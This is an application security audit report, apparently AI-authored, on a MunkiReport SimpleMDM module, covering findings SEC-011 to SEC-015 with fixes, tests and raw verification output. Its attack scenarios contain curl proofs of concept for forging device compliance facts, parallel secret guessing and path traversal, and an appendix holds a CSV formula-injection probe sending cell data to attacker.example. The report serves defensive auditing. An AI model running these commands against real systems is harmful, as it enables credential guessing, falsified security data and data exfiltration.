Enforcement was also placed in the constructor, because MunkiReport core answers `403` for an invalid token on the direct route before the action method runs, which would have left the per-endpoint gate unreachable on that path.

`REMOTE_ADDR` alone is used as the key; forwarded headers are attacker-controlled unless the request arrives through a configured trusted proxy, and allowing a caller to select its own throttle bucket would defeat the control.

**Fix rationale:** An initial implementation gated *before* validating the credential. That was corrected during self-review: it would have locked out a legitimate sync client sharing an egress address with an attacker. Checking only after a credential is found invalid means correct credentials always succeed regardless of counter state. The counter store fails open, on the reasoning that an unavailable cache must not take a working integration offline; the docblock states explicitly that reverse-proxy rate limiting remains the stronger control.

#### Verification

- Live, direct route: 22 invalid keys yield 19 × `403` then `429` with `Retry-After`.
- Live, `index?op=` route: 25 invalid keys yield 20 × `401` then `429` with body `{"status":"error","message":"Too many failed authentication attempts. Try again later."}`.
- Live, correct key while the source address is throttled: `200` with normal data — confirming the post-validation ordering.
- Live, request with no secret header: `200`, unaffected.
- `SecretHandlingGuardTest::testFailedSharedSecretAttemptsAreThrottled` asserts the gate is present on at least eight endpoints.

---

### SEC-012 — Client reporter integrity controls defaulted to off

| Field | Value |
|---|---|
| **Severity** | Low |
| **OWASP Category** | A06:2025 – Insecure Design (insecure default configuration) |
| **Status** | Fixed |
| **Location** | `simplemdm_controller.php` `client_reporter_hmac_enabled()`, `client_reporter_replay_protection_enabled()`, `client_reporter_per_device_tokens_enabled()`, and the `get_config()` defaults block |
| **Affected Version** | `97d7e2a` and earlier |
| **Fixed In** | `b7f1aa6` |

#### Description

The Option B client reporter accepts device-reported facts at `ingest_client_facts`. Three integrity controls exist and are correctly implemented — HMAC-SHA256 over `timestamp\nnonce\npayload` with `hash_equals` comparison and a skew window, single-use SHA-256-hashed nonces, and per-device SHA-256-hashed tokens — but all three defaulted to `'0'`.

In the default configuration the only control was a single shared secret distributed to every managed Mac.

#### Evidence

```php
// simplemdm_controller.php — before fix
private function client_reporter_hmac_enabled()
{
    return $this->get_config_value('client_reporter_hmac_enabled', '0') === '1';
}
private function client_reporter_replay_protection_enabled()
{
    return $this->get_config_value('client_reporter_replay_protection_enabled', '0') === '1';
}
private function client_reporter_per_device_tokens_enabled()
{
    return $this->get_config_value('client_reporter_per_device_tokens_enabled', '0') === '1';
}
```

```php
// validate_client_reporter_timestamp_and_hmac() — with both off, returns ok immediately
if (! $hmac_enabled && ! $replay_enabled) {
    return ['ok' => true, 'timestamp' => '', 'nonce' => ''];
}
```

#### Attack Scenario

**Threat Actor:** The user of any single managed Mac, or anyone who extracts the shared secret from one endpoint — it is present in a LaunchDaemon plist or shell wrapper on every enrolled device by design.

**Prerequisites:** The client reporter feature enabled, and read access to one device's copy of the shared secret.

**Step-by-step exploitation:**

1. The attacker reads the secret from their own device's reporter configuration.
2. With per-device tokens disabled, nothing binds a submission to the device that sent it. They POST facts for an arbitrary serial: their own device's compliance state is irrelevant, so they report a colleague's or an executive's machine as fully compliant.
3. With HMAC disabled, no signature is required, so the payload can be constructed freely. With replay protection disabled, no nonce or timestamp is needed either.
4. Compliance dashboards and supplemental data now show falsified state for machines the attacker does not own. A device that is actually unencrypted and unpatched reports as healthy.
5. A captured legitimate request can also be replayed indefinitely to freeze a device's reported state at a previous, healthier point.

**Concrete example payload or request:**

```bash
curl -X POST 'https://munkireport.example/module/simplemdm/ingest_client_facts' \
  -H 'X-SIMPLEMDM-CLIENT-SECRET: <shared secret from any device>' \
  -H 'Content-Type: application/json' \
  -d '{"serial_number":"SOMEONE-ELSES-SERIAL",
       "facts":{"filevault_enabled":true,"firewall_enabled":true}}'
# Accepted: no signature, no nonce, no device binding.
```

**Business Impact:** Corruption of the security posture data the organisation relies on for compliance reporting and remediation targeting. A machine that is genuinely non-compliant can be made to appear compliant, so it is never remediated — the harm is the absence of action rather than a direct breach. Rated Low because the feature is disabled by default (`client_reporter_enabled` also defaulted to `'0'`), so a deployment is only exposed if it deliberately enabled the feature without also enabling the hardening.

**Real-world precedent:** CWE-1188 (Insecure Default Initialization of Resource). Optional-by-default security controls are a recognised design failure; the industry has moved decisively toward secure defaults for exactly this reason.

#### Remediation Applied

```php
// Client reporter integrity controls default to ON.
//
// Changing the default does not alter existing installs: all three keys
// are in the save_config allow-list, so any site that has ever saved the
// SimpleMDM settings page has an explicit stored row that wins over the
// default here. A site with no stored row has never configured the feature
// and has client_reporter_enabled off as well.
private function client_reporter_hmac_enabled()
{
    return $this->get_config_value('client_reporter_hmac_enabled', '1') === '1';
}
// replay protection and per-device tokens likewise
```

The `get_config()` defaults block was updated to match so the admin UI reflects the same values.

**Fix rationale:** The implementations were already correct; only the defaults were wrong. The upgrade-safety argument was verified before changing them: all three keys appear in the `save_config` allow-list, so any deployment that has ever saved the settings page holds an explicit stored row that takes precedence over the default. A deployment with no stored row has never configured the feature and necessarily has `client_reporter_enabled` off, so no working integration can break.

#### Verification

- `SecretHandlingGuardTest::testClientReporterIntegrityControlsDefaultOn` asserts none of the three accessors reverts to a `'0'` default.
- Live: `get_supplemental_status` reports `"client_reporter_enabled":true` on the audited instance with its existing stored configuration intact, confirming stored values still take precedence.
- Full suite: `OK (113 tests, 215 assertions)`.

---

### SEC-013 — Throttle counter increment is not atomic

| Field | Value |
|---|---|
| **Severity** | Low |
| **OWASP Category** | A07:2025 – Authentication Failures |
| **Status** | Fixed |
| **Location** | `simplemdm_controller.php` `record_auth_failure()` |
| **Affected Version** | `b7f1aa6` – `708a542` |
| **Fixed In** | `35f9613` |

#### Description

`record_auth_failure()` performs a read-modify-write across two separate filesystem operations. The write uses `LOCK_EX`, but the preceding read is not covered by the same lock, so two concurrent requests can both read the same count and both write `count + 1` — losing one increment.

#### Evidence

```php
private function record_auth_failure($bucket)
{
    $file = $this->throttle_file($bucket);
    if ($file === '') { return; }

    $state = $this->read_throttle_state($file);   // <-- unlocked read
    $state['count']++;

    @file_put_contents(                            // <-- locked write, but the
        $file,                                     //     read above is stale
        json_encode(['count' => $state['count'], 'reset' => $state['reset']]),
        LOCK_EX
    );
```

#### Attack Scenario

**Threat Actor:** A remote attacker guessing shared secrets, as in SEC-011.

**Prerequisites:** The ability to issue concurrent requests — trivially available.

**Step-by-step exploitation:**

1. Rather than guessing serially, the attacker issues requests in parallel — say 50 at a time.
2. Many of those requests read the counter file at the same value before any of them writes, so a batch of 50 concurrent failures may record far fewer than 50 increments.
3. The effective budget rises above the nominal 20 per 15 minutes. The multiplier depends on concurrency and server timing and is not precisely predictable, but the control is measurably weaker than configured.
4. The throttle still engages eventually — the counter does advance, just more slowly than it should — so this degrades the control rather than defeating it.

**Concrete example payload or request:**

```bash
# 50 concurrent invalid attempts; fewer than 50 increments are recorded.
seq 1 50 | xargs -P 50 -I{} curl -s -o /dev/null \
  -X POST -H 'X-SIMPLEMDM-API-KEY: guess{}' -d '{}' \
  'https://munkireport.example/module/simplemdm/ingest'
```

**Business Impact:** Marginal. The control's stated purpose is to bound the order of magnitude of guessing volume, and it continues to do that. No confidentiality or integrity boundary is crossed by the imprecision itself.

**Real-world precedent:** CWE-367 (Time-of-check Time-of-use Race Condition), in its benign counter-accuracy form rather than a security-decision form.

#### Remediation Applied

The read and the write now happen under a single exclusive lock on one file handle.

```php
// simplemdm_controller.php — after fix
// 'c+' opens read/write, creates when absent, and does not truncate,
// so the existing bytes are still there to read under the lock.
$handle = @fopen($file, 'c+');
if ($handle === false) {
    return;
}

@chmod($file, 0600);

if (@flock($handle, LOCK_EX)) {
    $raw = stream_get_contents($handle);
    $state = $this->decode_throttle_state(is_string($raw) ? $raw : '');
    $state['count']++;

    rewind($handle);
    ftruncate($handle, 0);
    fwrite($handle, json_encode([
        'count' => $state['count'],
        'reset' => $state['reset'],
    ]));
    fflush($handle);
    flock($handle, LOCK_UN);
}

fclose($handle);
```

The parsing logic was extracted into `decode_throttle_state($raw)` and `fresh_throttle_state()`, so `record_auth_failure()` can decode bytes it has already read under its own lock instead of re-opening the file and racing with itself. `read_throttle_state($file)` remains for the two read-only callers and now delegates to the same decoder.

**Fix rationale:** `LOCK_EX` on `file_put_contents()` was never sufficient — by the time that lock is taken, the stale read has already happened. Correctness requires the lock to span the whole read-modify-write, which needs a persistent handle. `'c+'` is the mode that creates-without-truncating, so the prior value survives to be read inside the critical section.

#### Verification

- **A/B race test with real process concurrency**, 40 simultaneous increments against each algorithm:

  ```
  old  -> {"count":2,"reset":9999999999} (expected 40)
  new  -> {"count":40,"reset":9999999999} (expected 40)
  ```

  The old split read-modify-write recorded 2 of 40. The new single-lock version recorded all 40. This also confirms the test is discriminating rather than merely observing serialised requests.
- Live end-to-end: 40 concurrent invalid-key requests to `POST /module/simplemdm/ingest` produced a counter of exactly `{"count":40,...}`.
- `SecretHandlingGuardTest::testThrottleCounterIncrementIsAtomic` asserts the `'c+'` open and the `flock` are present, and that the old `file_put_contents` counter write cannot reappear.
- Full suite: `OK (115 tests, 222 assertions)`.

---

### SEC-014 — `--env-file` containment check is textual, not canonical

| Field | Value |
|---|---|
| **Severity** | Low |
| **OWASP Category** | A01:2025 – Broken Access Control |
| **Status** | Fixed |
| **Location** | `scripts/install_cron.sh` |
| **Affected Version** | `b7f1aa6` – `708a542` |
| **Fixed In** | `35f9613` |

#### Description

`install_cron.sh` refuses an `--env-file` path inside the module directory, because that directory is web-served and a secrets file there could be fetched over HTTP. The check is a shell prefix match, so it does not canonicalise the path — `..` traversal and symlinks are not resolved.

#### Evidence

```bash
if [ -z "${ENV_FILE##"$MODULE_DIR"/*}" ]; then
    echo "ERROR: --env-file must not live inside the module directory; it would be web-served." >&2
    exit 1
fi
```

A path such as `/var/munkireport/local/modules/simplemdm/../simplemdm/secrets.env` resolves into the module directory but does not match the prefix pattern, so it is accepted.

#### Attack Scenario

**Threat Actor:** Realistically, the administrator themselves — this is a guardrail against a mistake, not a boundary against an adversary. Anyone able to pass arguments to this script is already a global administrator with shell access on the host, and could simply write the file into the web root directly.

**Prerequisites:** An administrator running the installer with a non-canonical path, whether by accident (a relative path assembled by a wrapper script) or by pasting a path containing `..`.

**Step-by-step exploitation:**

1. The administrator runs the installer with a path that resolves into the module directory but does not textually match the prefix.
2. The containment check passes and the secrets file is written there at mode `0600`.
3. Filesystem permissions still protect it from other local users, but it now sits under the web root. If the web server is configured to serve files it should not — or a future misconfiguration exposes the module directory — the API key becomes fetchable over HTTP by an unauthenticated remote attacker.
4. The administrator believes the check protected them.

**Concrete example payload or request:**

```bash
./install_cron.sh --munkireport-url 'https://mr' \
  --env-file '/var/munkireport/local/modules/simplemdm/../simplemdm/sync.env' --install
# Accepted; the file lands under the web root.
```

**Business Impact:** Low, and contingent on a second web server misconfiguration to become exploitable. The value of fixing it is that a guardrail which can be stepped over without noticing gives false confidence.

**Real-world precedent:** CWE-22 in its path-canonicalisation form. Prefix-matching without `realpath` is a standard bypass.

#### Remediation Applied

Both paths are canonicalised with `pwd -P` — which resolves `..` and symlinked parents — before the containment comparison, and a symlinked target is refused outright.

```bash
# scripts/install_cron.sh — after fix
ENV_FILE_DIR=$(cd "$(dirname "$ENV_FILE")" 2>/dev/null && pwd -P) || true
if [ -z "$ENV_FILE_DIR" ]; then
    echo "ERROR: the directory for --env-file does not exist: $(dirname "$ENV_FILE")" >&2
    exit 1
fi
ENV_FILE="$ENV_FILE_DIR/$(basename "$ENV_FILE")"

# A symlink target is resolved by '>' on write, so it would sidestep the
# check below entirely. Refuse rather than chase it.
if [ -L "$ENV_FILE" ]; then
    echo "ERROR: --env-file must not be a symlink (got '$ENV_FILE')." >&2
    exit 1
fi

MODULE_DIR_REAL=$(cd "$MODULE_DIR" && pwd -P)
case "$ENV_FILE" in
    "$MODULE_DIR_REAL"|"$MODULE_DIR_REAL"/*)
        echo "ERROR: --env-file must not live inside the module directory; it would be web-served." >&2
        echo "       Resolved to: $ENV_FILE" >&2
        exit 1
        ;;
esac
```

`ENV_FILE` is reassigned to the canonical path, so the value written to disk and the value embedded in the cron line are the resolved one rather than the caller's spelling.

**Fix rationale:** Refusing a symlinked target is stricter than resolving it, and correct here — a secrets file has no legitimate reason to be a symlink, and following one would reintroduce the bypass through a path the parent-directory check cannot see. Requiring the parent directory to exist turns a silent later failure into an immediate, explicit error. The error message now prints the resolved path, so an administrator who trips the check can see why.

#### Verification

Live, against the real module directory:

```
1. traversal path resolving INTO the module dir  -> REFUSED
   ERROR: --env-file must not live inside the module directory; it would be web-served.
          Resolved to: /Users/.../local/modules/simplemdm/sync.env

2. legitimate path outside the module            -> ACCEPTED
   Secrets file: /private/tmp/ok.env (mode 0600, holds SIMPLEMDM_API_KEY)

3. nonexistent parent directory                  -> REFUSED
   ERROR: the directory for --env-file does not exist: /nope/nowhere

4. symlinked env-file                            -> REFUSED
   ERROR: --env-file must not be a symlink (got '/private/tmp/linked.env').
```

Case 2 also demonstrates the canonicalisation working in the accepting direction: `/tmp/ok.env` resolves to `/private/tmp/ok.env` on macOS, and that resolved path is what gets used.

- `bash -n scripts/install_cron.sh` clean.
- `SecretHandlingGuardTest::testEnvFilePathIsCanonicalisedBeforeContainmentCheck` asserts `pwd -P` canonicalisation, the `MODULE_DIR_REAL` comparison and the symlink refusal are present, and that the old textual prefix match cannot return.
- Full suite: `OK (115 tests, 222 assertions)`.

---

## False Positives

Items investigated during the audit that were initially suspected but determined not to be vulnerabilities.

### FP-001 — SimpleMDM API proxy assumed to skip TLS verification

| Field | Value |
|---|---|
| **Initial Concern** | `simplemdm_api_proxy_request()` performs outbound HTTPS requests to `https://a.simplemdm.com/api/v1/` using `file_get_contents()` with a stream context built by `stream_context_create()`. The context sets only an `http` array — method, headers, timeout, `ignore_errors` — and no `ssl` array at all. An earlier note in this engagement recorded this as "no explicit SSL verification", implying certificate validation might be skipped and the SimpleMDM API key exposed to an on-path attacker. |
| **Verdict** | False Positive |
| **Reasoning** | PHP's OpenSSL stream wrapper has defaulted `verify_peer` and `verify_peer_name` to `true` since PHP 5.6 (RFC: "Improved TLS defaults", 2014), and uses the system CA bundle when `cafile`/`capath` are unset. Certificate and hostname verification therefore occur on every request; the absence of an explicit `ssl` context array means defaults apply, not that verification is disabled. A vulnerability would require an *affirmative* `'ssl' => ['verify_peer' => false]` setting, which is not present anywhere in the module — a source-wide search for `verify_peer` returns no matches. The environment runs PHP 8.2.32, far above the 5.6 threshold. Setting the options explicitly would be harmless documentation but changes no behaviour, so no code change was made. |

---

## Open Findings

No open findings at time of report. Every confirmed vulnerability has been remediated and verified.

The single item below is carried as **Accepted Risk** rather than open: it is a confirmed but low-impact exposure whose remediation requires a database migration, which is a maintainer decision rather than an audit finding to close.

---

### SEC-015 — Dashboard trend exposes estate-wide counts under business units

| Field | Value |
|---|---|
| **Severity** | Low |
| **OWASP Category** | A01:2025 – Broken Access Control |
| **Status** | Accepted Risk — **formally accepted by the maintainer (hov172), 2026-08-08** |
| **Location** | `simplemdm_controller.php` `get_dashboard_trend()`, backed by `simplemdm_dashboard_snapshot` |
| **Affected Version** | All versions |
| **Fixed In** | Not fixed — see rationale |

#### Description

`get_dashboard_trend()` serves the trend widget from the `simplemdm_dashboard_snapshot` table, which stores pre-aggregated whole-estate totals — device count, enrolled, unenrolled, supervised, FileVault-enabled, DEP-enrolled, resource count — written periodically by `record_dashboard_snapshot()`.

Because the rows are already aggregated with no machine-group dimension, the SEC-003 scoping cannot be applied. There is no serial or group column to filter on.

#### Evidence

```php
private function record_dashboard_snapshot()
{
    $device_total    = (int) Simplemdm_model::count();          // whole estate
    $enrolled_total  = (int) Simplemdm_model::where('status', 'enrolled')->count();
    // ...
    Simplemdm_dashboard_snapshot_model::create([
        'snapshot_time'  => date('Y-m-d H:i:s'),
        'device_total'   => $device_total,
        'enrolled_total' => $enrolled_total,
        // ... no machine_group dimension
    ]);
}
```

#### Attack Scenario

**Threat Actor:** An authenticated user restricted to one business unit.

**Prerequisites:** A valid session and `enable_business_units` set to true.

**Step-by-step exploitation:**

1. The user loads the dashboard or requests `GET /module/simplemdm/get_dashboard_trend` directly.
2. The response contains 30 days of estate-wide totals.
3. They learn the organisation's total managed device count and its trend, plus aggregate FileVault, supervision and DEP enrolment ratios across all business units.
4. No individual device is identified. The disclosure is limited to organisational scale and aggregate posture — enough to infer relative size of other units or overall encryption coverage, not enough to target a specific machine.

**Concrete example payload or request:**

```bash
curl -b "$RESTRICTED_SESSION" \
  'https://munkireport.example/module/simplemdm/get_dashboard_trend'
# {"days":30,"has_history":true,"series":[{"date":"...","device_total":454, ...}]}
```

**Business Impact:** Low. Aggregate counts with no per-device attribution. For a managed service provider whose clients must not learn each other's scale, it is a genuine if minor confidentiality concern; for a single organisation separating internal departments it is close to immaterial.

**Real-world precedent:** Aggregate leakage across tenant boundaries is a recognised multi-tenancy design issue, typically addressed by making the aggregation itself tenant-aware.

#### Proposed Remediation

Add a `machine_group` column to `simplemdm_dashboard_snapshot`, have `record_dashboard_snapshot()` write one row per group, and scope `get_dashboard_trend()` to the caller's groups. This is a schema migration plus a change to snapshot generation, and historical rows would carry no group attribution and would need either backfilling or exclusion.

**Interim mitigation, documented in `docs/SECURITY.md`:** disable the trend widget where whole-estate counts are sensitive.

**Why accepted rather than fixed:** A migration in a security patch carries its own risk, the module's own guidance treats migrations as immutable once applied, and the exposure is aggregate-only. The correct owner for this decision is the maintainer, not the audit.

**Maintainer decision, 2026-08-08.** hov172 reviewed the exposure — 30 days of estate-wide device counts and aggregate FileVault/supervision/DEP ratios, with no serial, device name or per-device record disclosed — and accepted the risk. No migration will be made for it.

This closes the finding for planning purposes. It is not a deferral: the decision is that the disclosure is acceptable for this project's deployments, not that a fix is pending. Two conditions would reopen it:

- A deployment where tenants must not learn each other's scale, such as a managed service provider serving competing clients. The interim mitigation there is to disable the trend widget in the admin UI; nothing else depends on it.
- Any future change that adds per-device detail to `simplemdm_dashboard_snapshot`. The acceptance rests specifically on the rows being aggregate-only — a snapshot that carried serials would be a different finding.

Note the exposure is inert unless `enable_business_units` is on. With business units off, core grants every user every machine group, so these totals disclose nothing an authenticated user cannot already see throughout the UI.

---

## Remediation Roadmap

| Priority | Finding ID | Title | Owner | Target Date |
|---|---|---|---|---|
| Immediate | — | Merge `security/audit-remediation-v1.3.6` to `main` and release 1.3.6 | hov172 | 2026-08-08 |
| Immediate | SEC-009 | Operators: detect and rewrite pre-1.3.6 crontab entries, then **rotate the SimpleMDM API key** | Deployment owners | On upgrade |
| ~~This Sprint~~ | SEC-003 | ~~Verify business-unit scoping live~~ — **completed 2026-08-08**, 21/21 via `tests/manual/sec003_business_unit_scoping.php` | hov172 | Done |
| ~~This Sprint~~ | — | ~~Dependency CVE scan of `composer.lock`~~ — **completed 2026-08-08**: module clean (no runtime deps) | hov172 | Done |
| Immediate | — | **MunkiReport core** (separate project): 21 affected runtime packages. Prioritise `robrichards/xmlseclibs` + `onelogin/php-saml` if SAML auth is in use — digest/signature validation bypass. See Appendix A. | core maintainers | — |
| ~~This Quarter~~ | SEC-013 | ~~Make the throttle counter increment atomic under a single `flock`~~ — **completed 2026-08-07** | hov172 | Done |
| ~~This Quarter~~ | SEC-014 | ~~Canonicalise `--env-file` before the containment check~~ — **completed 2026-08-07** | hov172 | Done |
| ~~Backlog~~ | SEC-015 | ~~Decide whether to add `machine_group` to dashboard snapshots~~ — **decided 2026-08-08: risk accepted**, no migration. Reopen only if a tenant-isolating deployment appears or snapshots gain per-device detail. | hov172 | Closed |
| Backlog | — | `index()` dispatches only 8 of 13 `sync_actions`; `ingest_mcp_findings` and the four finding-status actions silently return the default page text. Functional defect, not a security issue. | hov172 | — |

---

## Appendix A — Raw Tool Output

### Dependency scanning

Performed 2026-08-08 (report revision 1.2). The environment's Composer is 2.2.6, which predates the `audit` subcommand (added in 2.4):

```
$ composer audit --format=plain
  [Symfony\Component\Console\Exception\CommandNotFoundException]
  Command "audit" is not defined.
```

Rather than install a scanner, the lock files were checked against Packagist's security-advisories API (`GET /api/security-advisories/?packages[]=…`), which is the same advisory database `composer audit` consumes. Installed versions were then matched against each advisory's affected ranges. This is a data fetch only — no third-party code was downloaded or executed.

**simplemdm module — CLEAN.**

```
### simplemdm module
    packages: 26  (runtime 0, dev 26)
    advisories returned: 4   affected: 0   unparseable: 0
```

The module declares **no runtime dependencies at all**. Its 26 locked packages are the PHPUnit toolchain under `packages-dev`, none of which reaches a production install. Packagist returned four advisories, all against `phpunit/phpunit`; the installed 10.5.64 falls outside every affected range, including CVE-2026-24765 whose 10.x range ends at `<10.5.62`.

**MunkiReport core — 22 affected packages, 21 of them runtime.**

Out of scope for this audit — core is a separate project — but recorded because it is the process this module runs inside, and a vulnerability there is reachable by the same requests.

```
### MunkiReport core (module runs inside this)
    packages: 127  (runtime 126, dev 1)
    advisories returned: 60   affected: 22   unparseable: 0
```

| Package | Installed | Advisories | Fixed in | Note |
|---|---|---|---|---|
| `guzzlehttp/guzzle` | 7.7.0 | 9 | ≥ 7.15.2 | Host-check bypass, cookie scope, proxy-auth leakage, cleartext proxy downgrade |
| `guzzlehttp/psr7` | 2.5.0 | 4 | ≥ 2.12.3 | CRLF injection, host confusion |
| `robrichards/xmlseclibs` | 3.1.1 | 2 | ≥ 3.1.5 | **Digest/signature validation bypass**, missing AES-GCM tag validation |
| `onelogin/php-saml` | 3.6.1 | 1 | ≥ 3.8.1 | SAML toolkit vulnerability via xmlseclibs |
| `symfony/yaml` | 3.4.47 | 3 | ≥ 5.4.52 | Parser DoS — billion laughs, ReDoS, stack exhaustion |
| `nesbot/carbon` | 2.67.0 | 1 | ≥ 2.72.6 | Arbitrary file include via `Carbon::setLocale` |
| `symfony/process` | 6.3.0 | 1 | ≥ 6.4.14 | Command execution hijack — Windows only |
| `squizlabs/php_codesniffer` | 2.9.2 | 1 | ≥ 3.13.6 | OS command injection (dev dependency) |

The pair worth acting on first is `robrichards/xmlseclibs` with `onelogin/php-saml`: a digest/signature validation bypass in an XML signature library, used by the SAML authentication path. **If this install uses SAML for login, treat that as an authentication-bypass risk.** Installs using local or LDAP auth do not exercise that code.

**Method caveat:** the version-range matching was implemented for this scan rather than using Composer's own semver library. All 60 advisory ranges parsed cleanly (`unparseable: 0`), and the module's clean result was additionally confirmed by reading the four phpunit ranges by hand. Treat the core figures as a strong indicator, and re-run with `composer audit` on a Composer ≥ 2.4 before planning core remediation.

### PHPUnit — final state

```
PHPUnit 10.5.64 by Sebastian Bergmann and contributors.

Runtime:       PHP 8.2.32
Configuration: /var/munkireport/local/modules/simplemdm/phpunit.xml

...............................................................  63 / 113 ( 55%)
..................................................              113 / 113 (100%)

Time: 00:00.075, Memory: 14.00 MB

OK (113 tests, 215 assertions)
```

Baseline before this engagement was 70 tests. The 43 added tests are the four new guard/unit files described in the Verification sections.

### PHP syntax check

```
$ for f in *.php views/*.php tests/Unit/*.php; do php -l "$f" | grep -v "^No syntax errors"; done
--- PHP LINT CLEAN ---
```

All 33 modified PHP files pass.

### Shell syntax check

```
$ bash -n scripts/install_cron.sh
--- SHELL LINT CLEAN ---
```

### Live verification — authentication throttle (SEC-011, SEC-008)

Direct route, 22 invalid keys:

```
403 403 403 403 403 403 403 403 403 403 403 403 403 403 403 403 403 403 403 429 429 429
```

`index?op=` route, 25 invalid keys:

```
401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 429 429 429 429 429

$ curl -s -X POST -H "X-SIMPLEMDM-API-KEY: bad" -d '{}' \
    "$B/module/simplemdm/index?op=ingest"
{"status":"error","message":"Too many failed authentication attempts. Try again later."}
```

Correct key while the source address is throttled:

```
get_mcp_finding_stats: 200
{"by_status":{"open":197,"acknowledged":2,"in_progress":0,"resolved":12,"ignored":0,"suppr...
```

Request with no secret header, unaffected:

```
no header: 200
```

Hardened throttle directory:

```
drwx------ 2 www-data www-data 4096 Aug  8 00:09 /tmp/simplemdm-auth-throttle-5618b4e8f6e70eb3
```

### Live verification — CSV formula injection (SEC-007)

Ingest of a finding whose message is a formula:

```json
{"status":"success","source":"sectest","scan_id":"scan_20260807T235415Z_1fed089a",
 "received":1,"inserted":1,"updated":0,"reopened":0,"resolved":0,"purged":0,
 "skipped":0,"replace":false}
```

Resulting CSV row — note the leading single quote:

```
262,sectest,SECTEST0001,csv_probe,test,info,open,"'=HYPERLINK(""https://attacker.example/?d=""&A1,""ok"")",,scan_20260807T235415Z_1fed089a,1,2026-08-07T23:54:15+00:00,2026-08-07T23:54:15+00:00,2026-08-07T23:54:15+00:00,
```

Probe row removed after verification:

```
deleted rows: 1
remaining findings: 211
```

### Live verification — no over-scoping regression (SEC-003)

With `enable_business_units` disabled, all read endpoints return unchanged data:

```
get_mcp_finding_stats        {"by_status":{"open":197,"acknowledged":2,"in_progress":0,"resolved":12,...
get_compliance_stats         {"total":454,"compliant":2,"noncompliant":452,"min_os":"","reasons":{...
get_os_security_stats        [{"os_version":"15.6.1","total":52,"enrolled_total":52,"supervised_total":52,...
get_assignment_group_stats   [{"label":"No Assignment Group","count":121},{"label":"LibLab","count":35},...
get_dashboard_trend          {"days":30,"has_history":false,"series":[{"date":"2026-07-11",...
get_mcp_finding_timeline     {"labels":["2026-07-09","2026-07-10",...
get_mcp_scan_status          {"sources":[{"source":"mcp_auto_get_stale_devices",...
get_resource_type_stats      [{"resource_type":"app","count":649},{"resource_type":"assignment_group","count":336},...
get_supplemental_status      {"status":"success","enabled":true,"client_reporter_enabled":true,...
get_events                   {"count":0,"events":[]}
```

### Live verification — env file quoting (SEC-004)

Round-trip with a key containing `'`, `"` and `$`:

```
file: SIMPLEMDM_API_KEY='test'\''key"123$x'
ROUNDTRIP OK
-rw-------
```

Cron entry emitted by `install_cron.sh --print-only`, containing no secret:

```
* * * * * set -a; . '/tmp/sm-test.env'; set +a; /usr/bin/python3 \
  /Users/helpdesk/websites/munkireport-php/local/modules/simplemdm/scripts/simplemdm_sync.py \
  --munkireport-url 'https://mr.example.com' --respect-schedule \
  --max-parent-resources 25 >> /var/log/simplemdm_sync.log 2>&1
```

---

## Appendix B — Files Reviewed

### Module — application code

- `simplemdm_controller.php`
- `simplemdm_mcp_finding_model.php`
- `simplemdm_model.php`, `simplemdm_config_model.php`, `simplemdm_resource_model.php`, `simplemdm_dashboard_snapshot_model.php`, `simplemdm_command_model.php`, `simplemdm_webhook_event_model.php`, `simplemdm_relationship_edge_model.php`, `simplemdm_device_history_model.php`, `simplemdm_sync_run_model.php`, `simplemdm_supplemental_summary_model.php`, `simplemdm_client_fact_model.php`, `simplemdm_client_fact_history_model.php`, `simplemdm_client_reporter_nonce_model.php`, `simplemdm_client_reporter_token_model.php`
- `simplemdm_factory.php`, `simplemdm_processor.php`
- `provides.yml`, `composer.json`, `phpunit.xml`, `.gitignore`

### Module — views

All 57 files under `views/`. Read in detail:

- `simplemdm_widget_modern_assets.php`, `simplemdm_listing.php`, `simplemdm_resources_listing.php`, `simplemdm_device.php`, `simplemdm_tab.php`, `simplemdm_admin.php`, `simplemdm_findings_page.php`
- `simplemdm_mcp_critical_widget.php`, `simplemdm_mcp_findings_widget.php`, `simplemdm_mcp_severity_widget.php`, `simplemdm_mcp_source_widget.php`, `simplemdm_mcp_timeline_widget.php`, `simplemdm_mcp_top_devices_widget.php`
- `simplemdm_devices_table_widget.php`, `simplemdm_group_apps_widget.php`, `simplemdm_group_widget.php`, `simplemdm_group_top_widget.php`, `simplemdm_resource_types_widget.php`, `simplemdm_resource_mix_widget.php`, `simplemdm_os_security_widget.php`, `simplemdm_sync_health_widget.php`, `simplemdm_supplemental_overview_widget.php`, `simplemdm_supplemental_applecare_widget.php`, `simplemdm_enrollment_widget.php`, `simplemdm_dep_widget.php`, `simplemdm_filevault_widget.php`, `simplemdm_supervised_widget.php`, `simplemdm_compliance_widget.php`, `simplemdm_command_status_widget.php`

Remaining `simplemdm_rt_*` widgets were swept for output sinks; none use the escaping helpers or interpolate server data into HTML.

### Module — scripts and documentation

- `scripts/install_cron.sh`, `scripts/remove_cron.sh`, `scripts/install.sh`, `scripts/uninstall.sh`
- `scripts/simplemdm_sync.py` (secrets and CLI/environment interface only)
- `scripts/install_client_reporter.sh`, `scripts/simplemdm_client_reporter_example.sh`, `scripts/simplemdm_client_reporter_hardened.py`, `scripts/postflight_simplemdm_client_reporter_example.sh`, `scripts/option_a_backend_check.php`, `scripts/option_b_smoke.sh`, `scripts/com.googlecode.munkireport-simplemdm-client-reporter.plist.example`
- `README.md`, `CHANGELOG.md`, `docs/SECURITY.md`, `docs/TESTING.md`, `docs/UPGRADE.md`, `docs/API_REFERENCE.md`

### MunkiReport core — trust boundary

- `app/controllers/Module.php`
- `app/helpers/site_helper.php`
- `app/lib/munkireport/AuthHandler.php`
- `app/lib/munkireport/User.php`
- `app/config/app.php` (business unit configuration)
- `system/kissmvc.php`

### Tests

- Existing: `tests/bootstrap.php`, `tests/Unit/McpFindingModelTest.php`, `tests/Unit/McpFindingUpsertDbTest.php`, `tests/Unit/McpFindingPurgeDbTest.php`, `tests/Unit/SafariScrollFixGuardTest.php`, `tests/Unit/ClientTabMarkupGuardTest.php`
- Added: `tests/Unit/OutputEscapingGuardTest.php`, `tests/Unit/SecretHandlingGuardTest.php`, `tests/Unit/MachineScopeGuardTest.php`, `tests/Unit/CsvInjectionTest.php`

---

## Appendix C — Revision History

| Version | Date | Author | Changes |
|---|---|---|---|
| 1.0 | 2026-08-07 | Claude Code (secure-webapp skill), for hov172 | Initial report covering the full module audit, the twelve remediations applied on branch `security/audit-remediation-v1.3.6` (`b7f1aa6`, `739a25b`, `9c1dc20`, `708a542`), two open Low findings, one accepted risk, and one false positive |
